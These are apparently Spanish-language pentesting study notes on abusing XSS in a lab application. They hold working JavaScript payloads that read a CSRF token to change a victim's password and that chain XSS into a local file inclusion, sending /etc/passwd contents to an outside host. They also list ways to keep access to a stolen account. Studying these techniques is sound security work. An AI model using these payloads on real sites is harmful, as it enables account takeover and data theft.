---
tags:
  - Web/Red-Team
  - Pentesting
  - Pentesting/Explotacion
  - XSS
Fecha de actualización: 2026-06-08
Nota previa: "[[00 - Introducción a la explotación XSS avanzada]]"
Nota siguiente: "[[02 - Enumeración de APIs internas]]"
Area: "[[XSS Avanzado.base|XSS Avanzado]]"
---
---

Con control total sobre la sesión de la víctima, el XSS puede disparar **cualquier** funcionalidad de la aplicación en su nombre. Los dos abusos directos: tomar su cuenta y encadenar con otra vulnerabilidad accesible solo desde su contexto.

# Account Takeover

Muchas aplicaciones permiten cambiar la contraseña del perfil **sin pedir la actual**. <mark style="background: #FFB86CA6;">Ese fallo de diseño, combinado con un XSS, es un account takeover directo</mark>: el payload cambia la contraseña de la víctima a una que conocemos, y entramos en su cuenta.

Cambiar la contraseña es el ejemplo clásico, pero cualquier flujo que permita apropiarse de la cuenta sin conocer credenciales sirve igual, y conviene buscarlos todos: **cambiar el email** (y luego pedir un reset de contraseña al nuevo email), **añadir un email o teléfono de recuperación** del atacante, **desactivar el MFA**, o **generar una API key / token de acceso** persistente. <mark style="background: #FF5582A6;">El vector más valioso es el que sobrevive a que la víctima recupere su cuenta</mark> — una API key o un email de recuperación dan acceso aunque la víctima cambie su contraseña después.

El formulario está protegido por token CSRF, pero como el XSS ejecuta **same-origin**, podemos leer el token de la página y añadirlo a la petición — sin necesidad de la [[04 - Bypass de tokens CSRF vía CORS|CORS misconfig]] que haría falta desde otro origen:

```js
// 1) Leer un token CSRF válido de la propia página
var xhr = new XMLHttpRequest();
xhr.open('GET', '/home.php', false);
xhr.withCredentials = true;
xhr.send();
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrftoken = encodeURIComponent(doc.getElementById('csrf_token').value);

// 2) Cambiar la contraseña de la víctima
var csrf_req = new XMLHttpRequest();
var params = `username=admin&email=admin@vulnerablesite.htb&password=pwned&csrf_token=${csrftoken}`;
csrf_req.open('POST', '/home.php', false);
csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send(params);
```

Tras ejecutarse en el navegador de la víctima, entramos con `admin:pwned`. <mark style="background: #8000E1A6;">El token CSRF no protege aquí porque el XSS vive en el mismo origen y puede leerlo</mark> — el mismo principio que en [[04 - Bypass de tokens CSRF vía CORS]], pero sin necesitar ningún fallo de CORS.

# Encadenar vulnerabilidades

El XSS no solo dispara la funcionalidad existente: es una plataforma para **descubrir y explotar otras vulnerabilidades** en endpoints que solo la víctima alcanza. La metodología:

1. Exfiltrar un endpoint privilegiado (`/home.php` → revela `/admin.php`) desde el contexto de la víctima.
2. Analizar su HTML en busca de parámetros sospechosos.
3. Probar y explotar la vulnerabilidad a través del payload XSS.

En el ejemplo, el panel admin acepta `?view=<fichero>` para cargar distintas vistas — un punto de entrada clásico de `Local File Inclusion`. Ajustamos el payload para leer un fichero arbitrario:

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php?view=../../../../etc/passwd', true);
xhr.withCredentials = true;
xhr.onload = () => {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.14.144:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();
```

<mark style="background: #FF5582A6;">El XSS convierte una vulnerabilidad que el atacante no podía alcanzar (un LFI en un panel admin) en explotable</mark>, porque la víctima sí lo alcanza y el payload actúa por ella.

> [!important]+ Por qué esto multiplica el impacto
> Un LFI o un SQLi en un panel admin que solo es accesible tras autenticarse como administrador parece de bajo riesgo desde fuera. Pero <mark style="background: #FFB86CA6;">un XSS que un administrador dispare convierte esos fallos "inalcanzables" en explotables</mark>. Al reportar, la cadena XSS→LFI vale mucho más que el XSS aislado: documenta siempre el impacto encadenado, no solo el `alert(1)`.

Cuando el endpoint objetivo no está en la misma aplicación sino en una **API interna** de la red de la víctima, el ataque se complica con la [[02 - Same-Origin Policy y CORS|Same-Origin Policy]]: [[02 - Enumeración de APIs internas]].

> [!info]+ Fuentes de referencia
> - [PortSwigger — Exploiting XSS to perform actions / steal data](https://portswigger.net/web-security/cross-site-scripting/exploiting)
> - [OWASP — Testing for Account Takeover](https://owasp.org/www-project-web-security-testing-guide/)
